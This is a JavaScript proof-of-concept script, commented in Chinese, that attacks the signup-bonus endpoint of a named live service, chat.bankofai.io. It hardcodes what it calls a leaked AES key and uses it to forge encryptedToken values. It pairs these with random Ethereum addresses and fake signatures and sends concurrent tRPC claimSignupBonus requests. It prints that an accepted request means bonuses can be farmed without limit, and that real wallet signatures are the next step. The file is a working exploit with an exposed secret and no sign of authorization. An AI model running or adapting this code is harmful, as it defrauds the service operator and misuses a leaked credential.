/**
 * POC: 批量 claim signup bonus — 测试后端是否验证签名
 *
 * 原理:
 * 1. 随机生成钱包地址 (ETH 格式)
 * 2. 用泄露的 AES key 伪造 encryptedToken
 * 3. 使用假签名
 * 4. 发送 claimSignupBonus 请求
 *
 * 如果服务器接受 → 签名未验证，漏洞可利用
 * 如果服务器拒绝 → 查看错误信息判断原因
 */

const CryptoJS = require('crypto-js');
const crypto = require('crypto');

const AES_KEY = '1wT1r7z8bZxDHVmZKAs6VFYSXOxmyh0lLByiw5TmF0=';
const TARGET = 'https://chat.bankofai.io';
const CONCURRENCY = 3;
const TOTAL = 10;

// §1 伪造 encryptedToken
function forgeToken(provider) {
  const payload = `${provider}|${Date.now()}`;
  return CryptoJS.AES.encrypt(payload, AES_KEY).toString();
}

// §2 随机生成 ETH 地址格式
function randomAddress() {
  return '0x' + crypto.randomBytes(20).toString('hex');
}

// §3 随机假签名
function fakeSignature() {
  return '0x' + crypto.randomBytes(65).toString('hex');
}

// §4 构造 SIWE 风格消息
function buildMessage(address) {
  const expiry = new Date(Date.now() + 30 * 60 * 1000).toISOString();
  return [
    'chat.bankofai.io wants you to sign in with your Ethereum account:',
    address,
    '',
    'Chain ID: 1',
    `Expiration Time: ${expiry}`,
    `Nonce: ${crypto.randomUUID()}`
  ].join('\n');
}

// §5 发送单个 claim 请求
// 正确格式: POST body 是 {"0":{"json":{...}}}
async function claimOne(index) {
  const address = randomAddress();
  const signature = fakeSignature();
  const message = buildMessage(address);
  const encryptedToken = forgeToken('eth');

  // tRPC batch: body 是对象，key 是 "0"
  const body = {
    '0': {
      json: {
        address,
        chain: 'eth',
        encryptedToken,
        message,
        signature,
        type: 'wallet',
        version: '3'
      }
    }
  };

  const url = `${TARGET}/trpc/lambda/user.claimSignupBonus?batch=1`;

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
      },
      body: JSON.stringify(body)
    });

    const text = await res.text();
    const statusCode = res.status;

    if (text.startsWith('<')) {
      const title = text.match(/<title>(.*?)<\/title>/)?.[1] || 'no title';
      console.log(`[#${index}] ${statusCode} | HTML_RESPONSE | ${title}`);
      return { index, status: statusCode, accepted: false, htmlTitle: title };
    }

    const data = JSON.parse(text);
    const result = Array.isArray(data) ? data[0] : data;
    const hasError = result?.error ? true : false;
    const errorMsg = result?.error?.message || result?.error?.code || result?.error?.data?.code || '无错误信息';
    const success = result?.result?.data?.json;

    console.log(`[#${index}] ${statusCode} | ${hasError ? 'REJECTED' : 'ACCEPTED'} | ${errorMsg}`);
    if (success) {
      console.log(`  >>> SUCCESS! Response: ${JSON.stringify(success)}`);
    }

    return { index, status: statusCode, accepted: !hasError, data };
  } catch (err) {
    console.log(`[#${index}] NETWORK_ERROR: ${err.message}`);
    return { index, status: 0, accepted: false, error: err.message };
  }
}

// §6 并发控制
async function batchWithConcurrency(items, concurrency, fn) {
  const results = [];
  for (let i = 0; i < items.length; i += concurrency) {
    const batch = items.slice(i, i + concurrency);
    const batchResults = await Promise.all(batch.map(fn));
    results.push(...batchResults);
  }
  return results;
}

// §7 主流程
async function main() {
  console.log('=== 批量 claim POC ===');
  console.log(`目标: ${TARGET}/trpc/lambda/user.claimSignupBonus`);
  console.log(`并发: ${CONCURRENCY}, 总数: ${TOTAL}`);
  console.log('');

  const items = Array.from({ length: TOTAL }, (_, i) => i + 1);
  const results = await batchWithConcurrency(items, CONCURRENCY, claimOne);

  const accepted = results.filter(r => r.accepted).length;
  const rejected = results.filter(r => !r.accepted).length;

  console.log('\n=== 结果汇总 ===');
  console.log(`接受: ${accepted}/${TOTAL}`);
  console.log(`拒绝: ${rejected}/${TOTAL}`);

  if (accepted > 0) {
    console.log('\n[CRITICAL] 后端未验证签名！可以无限刷 signup bonus！');
    console.log('下一步: 用真实钱包签名 + 真实地址，100% 成功率');
  } else {
    console.log('\n[INFO] 所有请求被拒绝。查看拒绝原因判断下一步:');
    const sampleError = results.find(r => r.data && !r.htmlTitle)?.data;
    if (sampleError) {
      console.log('错误示例:', JSON.stringify(sampleError, null, 2));
    }
  }
}

main();
